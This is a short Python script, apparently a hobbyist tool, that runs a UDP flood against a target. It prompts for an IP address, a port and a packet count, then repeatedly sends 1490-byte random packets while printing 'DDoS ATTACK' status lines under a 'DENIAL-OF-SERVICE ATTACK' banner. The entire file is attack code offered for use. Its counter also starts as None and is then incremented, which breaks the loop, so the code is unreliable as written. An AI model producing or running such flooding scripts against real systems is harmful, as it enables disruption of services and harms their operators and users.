import os,time,socket,random

os.system("cls")

print("""

                                              \u001b[33mDENIAL-OF-SERVICE ATTACK
                                                     
           """)


ip=input(" \u001b[36mSystem Ip Address: ")

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet=random._urandom(1490)

port=int(input(" \u001b[31mWhich port would you like to use: "))
sent = None
packetwith=int(input(" \u001b[34mHow many packages should you send: "))

for i in range(packetwith):
  sock.sendto(packet,(ip,port))
  sent = sent + 1
  print(" \u001b[33mIN TARGET SYSTEM \u001b[35mDDoS ATTACK","\u001b[31mSENDING =",sent,"\u001b[36mPORT =",port)



